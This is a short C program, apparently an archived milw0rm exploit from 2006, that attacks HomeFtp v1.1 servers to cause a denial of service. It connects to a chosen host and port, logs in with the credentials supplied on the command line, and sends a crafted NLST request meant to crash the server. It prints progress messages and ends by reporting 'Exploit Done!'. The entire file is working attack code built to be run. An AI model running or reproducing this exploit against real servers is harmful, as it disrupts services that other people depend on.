/*
HomeFtp v1.1 Denial of Service
original advisory: http://kapda.ir/advisory-202.html
homeftp_v1.1_xpl.c
----------------------------------------
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define  POCSTR "USER %s\x0d\x0aPASS %s\x0d\x0aNLST\x0d\x0a"

int header();
int usage(char *filename);
int remote_connect( char* ip, unsigned short port );

int header() {
printf("\n[i] KAPDA - Computer Security Science Researchers Institute\n\n");
printf("[i] Title:              \tHomeFTP <= v1.1 Dos Exploit\n");
printf("[i] Discovered by:      \tcvh {a] kapda.ir\n");
printf("[i] Exploit by:         \tPi3cH {a] kapda.ir\n");
printf("[i] More info:          \twww.kapda.ir/page-advisory.html\n\n");
return 0;
}

int usage(char *filename) {
printf("[i] Usage:   \t%s HOST PORT USERNAME PASSWORD\n",filename);
printf("[i] Example: \t%s 127.0.0.1 21 anonymous none\n\n",filename);
exit(0);
}

int remote_connect( char* ip, unsigned short port )
{
int s;
struct sockaddr_in remote_addr;
struct hostent* host_addr;

memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
{
printf ( "[e] Cannot resolve \"%s\"\n", ip );
exit ( 1 );
}
remote_addr.sin_family = AF_INET;
remote_addr.sin_port = htons ( port );
remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
{
printf ( "[e] Socket failed!\n" );
exit(1);
}
if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
{
printf ( "[e] Failed connecting!\n" );
       exit(1);
}
return ( s );
}


int main(int argc, char *argv[]) {
 int s;
 char *request;
 header();
 if( (argc < 5) )
     usage(argv[0]);
 request = (char *) malloc(1024);
 printf("[r] Connecting to remote host\n");
 s = remote_connect(argv[1],atoi(argv[2]));
 sleep(1);
 printf("[r] Creating buffer\n");
 sprintf(request,POCSTR,argv[3],argv[4]);
 printf("[r] Sending %d bytes of DOS buffer\n",strlen(request));
 if ( send ( s, request, strlen (request), 0) <= 0 )
 {
         printf("[e] Failed to send buffer\n");
         close(s);
         exit(1);
 }
 sleep(1);
 printf("[s] Exploit Done!\n");
 close(s);
 free(request);
 request = NULL;
 return 0;
}

// milw0rm.com [2006-01-14]